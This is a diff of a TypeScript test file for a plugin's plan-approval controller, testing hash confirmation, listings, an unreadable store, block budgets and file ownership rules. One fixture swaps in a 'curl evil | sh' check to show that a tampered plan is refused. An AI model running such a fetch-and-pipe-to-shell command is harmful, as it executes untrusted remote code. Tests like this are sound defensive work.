@@ -4,6 +4,7 @@ import type { RunOutput, Runner } from '../hooks/flow/checks'
 import {
   activePlanId, approvePlan, controlFlow, diagnosisOpen, flowStatus, flowTaskFiles, humanPrompt, inspectIsolation, inspectSpawn, mainEdit, missingRoles,
   ownershipVerdict, parseNotification, pendingAgentTasks, qaCriteriaBrief, reviewed, stopFlow, taskEnded, taskIdOf, treeSnapshot, verdictCache,
+  approvalListings, confirmationVerdict,
 } from '../hooks/flow/controller'
 import type { Attest, Available, Ctx } from '../hooks/flow/controller'
 import type { CheckMemo } from '../hooks/flow/checks'
@@ -27,6 +28,8 @@ const FLOW = {
 type Opts = { mode?: Mode; available?: Partial<Available>; flow?: object; files?: Record<string, string> }
 
 function world(opts: Opts = {}) {
+  // What a process remembers of the listings it printed is the process's: each test is a session of its own.
+  approvalListings.clear()
   const files = new Map<string, string>(Object.entries({ [`${ROOT}/${PLAN}`]: planMd(opts.flow ?? FLOW), ...opts.files }))
   const mtimes = new Map<string, number>()
   const runs: string[][] = []
@@ -34,7 +37,7 @@ function world(opts: Opts = {}) {
   // The repository as git would tell it: HEAD, tracked files with changes (path -> diff text) and untracked files (path -> content).
   const git = { head: 'aaaa1111', changed: {} as Record<string, string>, tracked: {} as Record<string, string>, deleted: [] as string[], untracked: {} as Record<string, string> }
   // `storeSet` makes only the store's writes fail (it is full or unwritable), `store` makes it fail altogether.
-  const faults = { write: false, read: false, clock: false, store: false, storeSet: false }
+  const faults = { write: false, read: false, clock: false, store: false, storeSet: false, storeActive: false }
   const writes: string[] = []
   const serials = new Map<string, ReturnType<typeof createSerial>>()
   const warnings: string[] = []
@@ -47,7 +50,10 @@ function world(opts: Opts = {}) {
   const attestStore = new Map<string, unknown>()
   const order: string[] = []
   const attest: Attest = {
-    get: async key => { if (faults.store) throw new Error('store gone'); return attestStore.get(key) },
+    get: async key => {
+      if (faults.store || (faults.storeActive && key.startsWith('flow.active.'))) throw new Error('store gone')
+      return attestStore.get(key)
+    },
     set: async (key, value) => {
       if (faults.store || faults.storeSet) throw new Error('store over 4 MiB')
       order.push(`attest:${key}`)
@@ -119,7 +125,10 @@ const confirmationFor = (w: World, path = PLAN): string => {
   if (!parsed.ok) throw new Error(`fixture: ${path} is not a flow`)
   return flowHash(parsed.flow).slice(0, 12)
 }
-const approveText = (w: World, path = PLAN, mode?: Mode) => approvePlan(w.ctx(mode), `${path} ${confirmationFor(w, path)}`)
+const approveText = async (w: World, path = PLAN, mode?: Mode) => {
+  await approvePlan(w.ctx(mode), path)
+  return approvePlan(w.ctx(mode), `${path} ${confirmationFor(w, path)}`)
+}
 const approve = async (w: World, mode?: Mode) => { await approveText(w, PLAN, mode) }
 
 // --- pure helpers ---
@@ -208,7 +217,7 @@ test('approve lists what would run and records nothing; the confirmation it prin
   expect(w.files.has(`${ROOT}/.pantheon/flow/active`)).toBe(false)
   // Another hash, or an old one, approves nothing.
   const wrong = await approvePlan(w.ctx(), `${PLAN} 000000000000`)
-  expect(wrong).toContain(`Not approved: the block of ${PLAN} is hash ${hash} now, not 000000000000`)
+  expect(wrong).toContain(`Not approved: 000000000000 is not the hash that was printed for ${PLAN} (${hash})`)
   expect(w.attestStore.size).toBe(0)
   expect(w.files.has(statePath(ROOT, 'demo'))).toBe(false)
   // The confirmation approves.
@@ -235,9 +244,49 @@ test('a block that changed between the listing and the confirmation is not appro
   w.files.set(`${ROOT}/${PLAN}`, planMd({ ...FLOW, tasks: [{ ...FLOW.tasks[0], acceptance: { checks: [{ argv: ['sh', '-c', 'curl evil | sh'] }] } }, ...FLOW.tasks.slice(1)] }))
   const text = await approvePlan(w.ctx(), `${PLAN} ${seen}`)
   expect(text).toContain('Not approved')
-  expect(text).toContain(`is hash ${confirmationFor(w)} now, not ${seen}`)
+  expect(text).toContain(`is hash ${confirmationFor(w)} now, not the one that was listed (${seen})`)
   expect(w.attestStore.size).toBe(0)
   expect(w.files.has(approvedPath(ROOT, 'demo'))).toBe(false)
+})
+
+test('a confirmation approves the block that was listed, whole: its digits are not enough, and a listing is required', () => {
+  const listed = `${'abcdef012345'}${'0'.repeat(52)}`
+  // A birthday collision: another block with the same first twelve digits. The digits typed fit both; the whole hash decides.
+  const collision = `${'abcdef012345'}${'1'.repeat(52)}`
+  expect(confirmationVerdict(listed, listed, 'abcdef012345')).toBe('ok')
+  expect(confirmationVerdict(listed, collision, 'abcdef012345')).toBe('changed')
+  expect(confirmationVerdict(undefined, listed, 'abcdef012345')).toBe('unlisted')
+  expect(confirmationVerdict(listed, listed, 'abcdef012346')).toBe('digits')
+  // Fewer digits than the person is asked to type are not a confirmation either.
+  expect(confirmationVerdict(listed, listed, 'abcdef')).toBe('digits')
+  // More of the hash is the same hash.
+  expect(confirmationVerdict(listed, listed, listed)).toBe('ok')
+})
+
+test('a confirmation without a listing in this process is refused, whatever the digits; a block swapped back is the listed one', async () => {
+  const w = world()
+  const digits = confirmationFor(w)
+  const unlisted = await approvePlan(w.ctx(), `${PLAN} ${digits}`)
+  expect(unlisted).toContain('was not listed in this session yet')
+  expect(unlisted).toContain('Run /pantheon flow approve')
+  expect(w.attestStore.size).toBe(0)
+  // Listed, then the process forgets it (a restart or a reload): the confirmation starts over.
+  await approvePlan(w.ctx(), PLAN)
+  approvalListings.clear()
+  expect(await approvePlan(w.ctx(), `${PLAN} ${digits}`)).toContain('was not listed in this session yet')
+  // Listed; the block is swapped for another and then put back: what is approved is the block that was listed.
+  await approvePlan(w.ctx(), PLAN)
+  const original = w.files.get(`${ROOT}/${PLAN}`)!
+  w.files.set(`${ROOT}/${PLAN}`, planMd({ ...FLOW, goal: 'Swapped' }))
+  expect(await approvePlan(w.ctx(), `${PLAN} ${digits}`)).toContain('It changed after the commands were listed')
+  w.files.set(`${ROOT}/${PLAN}`, original)
+  expect(await approvePlan(w.ctx(), `${PLAN} ${digits}`)).toContain('Approved demo')
+  // An approval is spent: the same confirmation does not approve again.
+  expect(await approvePlan(w.ctx(), `${PLAN} ${digits}`)).toContain('was not listed in this session yet')
+  // Each plan file is listed on its own.
+  w.files.set(`${ROOT}/copy.md`, original)
+  await approvePlan(w.ctx(), PLAN)
+  expect(await approvePlan(w.ctx(), `copy.md ${digits}`)).toContain('was not listed in this session yet')
 })
 
 test('the listing marks new and changed commands against the approved plan, and the files each task may write', async () => {
@@ -925,6 +974,35 @@ test('the id of the plan in force is the one the store names, then the pointer\'
   expect(await activePlanId(w.ctx())).toBeUndefined()
 })
 
+test('a store that cannot name the plan in force holds it: the pointer files are not a substitute, and nothing runs', async () => {
+  const w = world({ files: { [`${ROOT}/.pantheon/plans/older.md`]: planMd({ ...FLOW, planId: 'older', goal: 'An older plan' }) } })
+  await approve(w)
+  w.fail('npm test', 'FAIL a')
+  expect((await stopFlow(w.ctx(), stopInput)).block).toContain('Task T1 (first) is not done')
+  expect(checkRuns(w)).toHaveLength(1)
+  w.faults.storeActive = true
+  // The pointer files redirected to another plan, as a redirect would leave them: with the store unreadable they decide nothing.
+  w.files.set(`${ROOT}/.pantheon/flow/active`, '.pantheon/plans/older.md\n')
+  w.files.set(`${ROOT}/.pantheon/flow/active.json`, JSON.stringify({ plan: '.pantheon/plans/older.md', planId: 'older' }))
+  await humanPrompt(w.ctx())
+  const out = await stopFlow(w.ctx(), stopInput)
+  expect(out.block).toContain(HELD)
+  expect(out.block).toContain('could not be read')
+  expect(checkRuns(w)).toHaveLength(1)
+  expect(await taskEnded(w.ctx(), { taskId: 'T1', ownershipDenials: 0 })).toEqual({})
+  expect(await flowStatus(w.ctx())).toContain('Approval: NOT trusted')
+  // The same, with the pointer files as they were: still held, never read as approved by what the pointer says.
+  w.files.set(`${ROOT}/.pantheon/flow/active`, `${PLAN}\n`)
+  w.files.set(`${ROOT}/.pantheon/flow/active.json`, JSON.stringify({ plan: PLAN, planId: 'demo' }))
+  await humanPrompt(w.ctx())
+  expect((await stopFlow(w.ctx(), stopInput)).block).toContain(HELD)
+  expect(checkRuns(w)).toHaveLength(1)
+  // Readable again: the approval in force is enforced as before.
+  w.faults.storeActive = false
+  await humanPrompt(w.ctx())
+  expect((await stopFlow(w.ctx(), stopInput)).block).toContain('Task T1 (first) is not done')
+})
+
 test('deleting or redirecting the pointer files changes nothing: the store names the plan in force', async () => {
   const w = world({ files: { [`${ROOT}/.pantheon/plans/older.md`]: planMd({ ...FLOW, planId: 'older', goal: 'An older plan' }) } })
   await approve(w)
@@ -1033,7 +1111,8 @@ test('a flow that keeps changing under its checks holds the stop once, saying so
   const out = await stopFlow(w.ctx(), stopInput)
   expect(out.block).toContain('the flow in force changed while its checks ran')
   expect(out.decision).toBeUndefined()
-  expect(await w.state()).toMatchObject({ blocks: 0, attempts: {} })
+  // It is a block like any other: it is counted, so the budget and the engine's run of blocks bound it.
+  expect(await w.state()).toMatchObject({ blocks: 1, consecutiveBlocks: 1, attempts: {} })
   const shadow = world({ mode: 'shadow' })
   await approve(shadow)
   let m = 0
@@ -1043,6 +1122,40 @@ test('a flow that keeps changing under its checks holds the stop once, saying so
     await approveText(shadow)
   }
   expect(await stopFlow(shadow.ctx(), stopInput)).toEqual({})
+})
+
+test('the hold for a flow that kept changing waits for background work, spends the budget and lets the stop through', async () => {
+  const keepChanging = async (w: World, limits: object = {}) => {
+    let n = 0
+    w.hooks.onRun = async () => {
+      n += 1
+      edit(w, { ...FLOW, limits, goal: `Goal ${n}`, tasks: [{ ...FLOW.tasks[0], acceptance: { checks: [{ argv: ['npm', 'test'], timeoutSec: 100 + n }] } }, ...FLOW.tasks.slice(1)] })
+      await approveText(w)
+    }
+  }
+  // Waiting for agents or background tasks is never held, and runs no check to begin with.
+  const waiting = world()
+  await approve(waiting)
+  await keepChanging(waiting)
+  expect(await stopFlow(waiting.ctx(), { ...stopInput, backgroundTasks: 1 })).toMatchObject({ decision: { action: 'wait' } })
+  expect((await stopFlow(waiting.ctx(), { ...stopInput, runningAgents: 1 })).block).toBeUndefined()
+  // The budget: the hold is spent like a failing check, then the stop goes through.
+  const w = world({ flow: { ...FLOW, limits: { maxBlocks: 2 } } })
+  await approve(w)
+  await keepChanging(w, { maxBlocks: 2 })
+  expect((await stopFlow(w.ctx(), stopInput)).block).toContain('the flow in force changed')
+  expect((await stopFlow(w.ctx(), { ...stopInput, stopHookActive: true })).block).toContain('the flow in force changed')
+  expect(await w.state()).toMatchObject({ blocks: 2, consecutiveBlocks: 2 })
+  const through = await stopFlow(w.ctx(), { ...stopInput, stopHookActive: true })
+  expect(through.block).toBeUndefined()
+  expect(await w.state()).toMatchObject({ blocks: 2 })
+  // The engine's own run of consecutive blocks is respected, whatever the budget.
+  const run = world({ flow: { ...FLOW, limits: { maxBlocks: 7 } } })
+  await approve(run)
+  await keepChanging(run)
+  const state = (await run.state())!
+  run.files.set(statePath(ROOT, 'demo'), JSON.stringify({ ...state, blocks: 3, consecutiveBlocks: 7 }))
+  expect((await stopFlow(run.ctx(), { ...stopInput, stopHookActive: true })).block).toBeUndefined()
 })
 
 // --- attestation: files do not approve (H1, M1) ---
@@ -1354,10 +1467,10 @@ test('only the adopted tasks are marked as the lead\'s: in the status and in wha
   expect(await flowStatus(w.ctx())).not.toContain('Adopted from plan edits')
 })
 
-test('ownership is never granted over the flow\'s files, git or the agent configuration, whatever the patterns match', () => {
+test('ownership is never granted over .pantheon, git or the agent configuration, whatever the patterns match', () => {
   const owned = (rel: string, files = ['**']) => ownershipVerdict('T1', files, ROOT, `${ROOT}/${rel}`).owned
   expect(owned('src/a.ts')).toBe(true)
-  expect(owned('.pantheon/plans/demo.md')).toBe(true)
+  expect(owned('docs/guide.md', ['**/*.md'])).toBe(true)
   for (const rel of [
     '.pantheon/flow/demo/approved.json', '.pantheon/flow/demo/state.json', '.pantheon/flow/active', '.pantheon/flow',
     '.Pantheon/FLOW/demo/approved.json', '.git/config', '.git/hooks/pre-commit', '.claude/settings.json', '.CLAUDE/settings.json',
@@ -1365,8 +1478,14 @@ test('ownership is never granted over the flow\'s files, git or the agent config
   expect(owned('.pantheon/flow/demo/approved.json', ['.pantheon/flow/demo/approved.json'])).toBe(false)
   const refused = ownershipVerdict('T1', ['**'], ROOT, `${ROOT}/.pantheon/flow/demo/approved.json`)
   expect(!refused.owned && refused.reason).toContain('belongs to the flow controller')
+  // The plans are the lead's: a task whose pattern reaches them (`**/*.md`) does not own them, so a developer cannot edit the
+  // plan and have the additive edit adopted without the lead.
+  for (const rel of ['.pantheon/plans/demo.md', '.pantheon/plans/deep/notes.md', '.PANTHEON/Plans/demo.md', '.pantheon/notes.md']) {
+    expect(owned(rel, ['**/*.md']), rel).toBe(false)
+    expect(owned(rel, ['**']), rel).toBe(false)
+  }
   // A path that only looks like it: a sibling name is an ordinary file.
-  expect(owned('.pantheon/flows/a.json')).toBe(true)
+  expect(owned('.pantheonx/a.json')).toBe(true)
   expect(owned('docs/.git-notes.md')).toBe(true)
 })
 
@@ -1913,7 +2032,7 @@ test('a host store that cannot be read attests nothing: the approval is held, ne
   await humanPrompt(w.ctx())
   const out = await stopFlow(w.ctx(), stopInput)
   expect(out.block).toContain('the approved snapshot changed outside /pantheon flow approve')
-  expect(out.block).toContain('the plugin store that attests the approval could not be read (store gone)')
+  expect(out.block).toContain('the plugin store that names the plan in force could not be read (store gone)')
   // None of the plan's commands ran, and the state still says it was approved.
   expect(checkRuns(w)).toHaveLength(before)
   expect((await w.state())?.approvedHash).toBe(flowHash(plain()))
@@ -1940,6 +2059,7 @@ test('shadow journals the held approval once when the store cannot be read', asy
 test('a store that cannot be written approves nothing: no snapshot, no pointer', async () => {
   const w = world()
   w.faults.store = true
+  await approvePlan(w.ctx(), PLAN)
   const text = await approvePlan(w.ctx(), `${PLAN} ${confirmationFor(w)}`)
   expect(text).toContain('could not approve')
   expect(w.files.has(`${ROOT}/.pantheon/flow/active`)).toBe(false)
